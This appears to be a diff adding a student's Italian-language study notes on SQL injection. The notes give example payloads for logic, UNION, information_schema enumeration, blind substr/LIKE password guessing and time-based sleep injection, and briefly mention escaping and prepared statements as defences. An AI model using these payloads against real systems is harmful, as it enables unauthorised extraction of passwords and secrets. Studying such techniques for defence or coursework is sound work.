@@ -1,0 +1,75 @@
+payload di base per logic sql: ' or 1=1 -- 
+
+UNION SQL
+payload per union: 1 union select 1,2,3
+importante che il numero di colonne nella union (che verrà attaccata a una where) sia lo stesso che restituiva la select 
+inoltre il tipo di dato deve essere lo stesso
+devo provare bruteforce per vedere prima con 1 colonna nella union, poi 2 pi 3 finchè la query non restituisce ok (negli altri casi error)
+SELECT column_1 FROM table WHERE column_2 = 1 union SELECT secret FROM secrets
+
+se non so quante colonne ha l'input devo usare la order by finchè mi dà errore(per non provare un bruteforce)
+1 order by 1 
+1 order by 2
+ordina per la colonna specificata, se metto un numero che è maggiore del numero di colonne mi dà errore 
+
+devo limitare la query iniziale (la select a cui attacco la union) per vedere solo il risultato della select dopo la union e non di entrambe
+1 and 1=0 union select 1,2,3 (select c1,c2,c3 form table where c1=1 and 1=0 union select 1,2,3)
+qui la where della prima select è colonna=1 and 1=0 che è sempre falsa, quindi vedo solo i risultati della union
+
+
+information_schema informazioni sul database
+tabelle utili: schemata (ogni schema del db) tables(tutte le tabelle) columns(tutte le colonne)
+esempio di query: select schema_name from information_schema.schemata
+restisuisce solo le tabelle dello schema voluto: select table_name from information_schema.tables where table_schema= 'someschema' --
+recupera solo le colonne della tabella voluta: select table_name,column from information_schema.columns where table_schema=database()
+da notare che uso database() che rappresenta il database attualmente attivo
+
+per combinare due righe in una usa group_concat (il payload parte sempre dopo la where)
+select title from posts where id = 1 and 1=0 union select 1,group_concat(table_name,':',column_name) from information_schema.columns where table_schema=database()
+se al poaro di table_name e column name e information schema metto delle tabelle e colonne posso estrarre dati dal db
+
+
+BLIND SQL
+quando non so quale sia la query fatta al server e non mi restituisce nulla
+devo 
+	trovare payload che restituisce true o false 
+	capire come ottenere true o false,
+	scrivere uno script che automatizzi i risultati
+
+per TROVARE il payload cerco inserisco query che restituisce vero e la metto in and
+select  from posts where id = 1 and (select 1 where expression) = 1 
+il payload dopo la where se è vero ottengo dati, altrimenti non ottengo nulla
+
+Come indovinare i caratteri di una determinata colonna? uso substr e like
+
+substr(string,start,length)
+select * from posts where id=1 and (select 1 from users where id=1 and substr(password,4,1)='x')=1
+controllo se il quarto carattere della password è x, se non lo è la subquery restituisce false quindi in and mi dà false
+
+like usa delle wildcard come % (più caratteri) e _ (un carattere) (ad esempio where username like 'a%' vero se iniziano per a)
+'foobar' like 'foo' false
+'doobar like 'foo%' true
+'foobar' like '%o%' true
+'foobar' like 'fooba_' true 
+il controllo è CASE INSENSITIVE (lettere maiuscole e minuscoele uguali)
+
+esempi query: 
+SELECT * FROM posts WHERE id=1 AND (SELECT 1 FROM users WHERE id=1 AND password LIKE 'b%') = 1 se mi da true e restituisce dati il primo carattere della password è a, procedo col secondo
+SELECT * FROM posts WHERE id=1 AND (SELECT 1 FROM users WHERE id=1 AND password LIKE 'bc%') = 1 ora ho provato ba e bb e mi davano vuoto, con bc ho i post quindi inzia con bc la password
+
+per CAPIRE come ottenere true o false
+uso sleep per fare in modo che la query ci metta di più se la condizione che inietto è vera ed eseguo una TIME-BASED SQL
+SELECT sleep(1) FROM secrets WHERE secret LIKE 'a%' LIMIT 1
+se la condizione like è vera la query ci mette 1 secondo, se è falsa mi dà subito i risultati 
+controllo con uno script il time prima della query e dopo la query e guardo se è > 1 la condizione della query era vera
+nello script provo tutti i caratteri di un dizionario in tutte le posizioni 
+
+
+ESCAPING:
+trasformo il ' in \' uno dei modi per prevenire sql injection
+PREPARED STATEMENT:
+separano codice della query sql dai dati inseriti, ad esempio in phpp si usano le PDO statement 
+
+
+
+
